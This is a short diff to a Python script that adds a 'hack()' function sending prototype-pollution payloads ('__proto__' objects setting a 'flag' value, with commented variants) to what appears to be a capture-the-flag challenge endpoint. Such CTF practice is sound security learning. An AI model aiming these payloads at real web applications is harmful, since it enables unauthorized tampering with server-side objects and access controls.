@@ -50,6 +50,24 @@ def self():
     print(r.text)
 
 
+
+def hack():
+
+    # args = {"options": {"JJ":"FF", "__proto__": {'flag': 'admin', "time":"1"}}}
+    # args = {"options":{"__proto__": {"options": {"flag": "something"}}}}
+    # args = {"out": {"__proto__": {"options": {"flag": "something"}}}}
+    args = {"__proto__": {"flag": "something"}}
+    # args = {"__proto__": {"userID": "Your mom"}}
+
+    # args = {"__proto__": {"options": {"flag": "true"}}}
+
+    r = requests.post("http://invisible-ink.c.ctf-snyk.io/echo", json=args)
+
+    print(r.content)
+
+
+
+
 def ml_api(team1:str, team2:str):
 
     ENDPOINT_ID = "1932365297537253376"
@@ -84,4 +102,4 @@ def ml_api(team1:str, team2:str):
 if __name__ == '__main__':
 
     # predictions = ml_api("France", "Italy")
-    self()
+    hack()
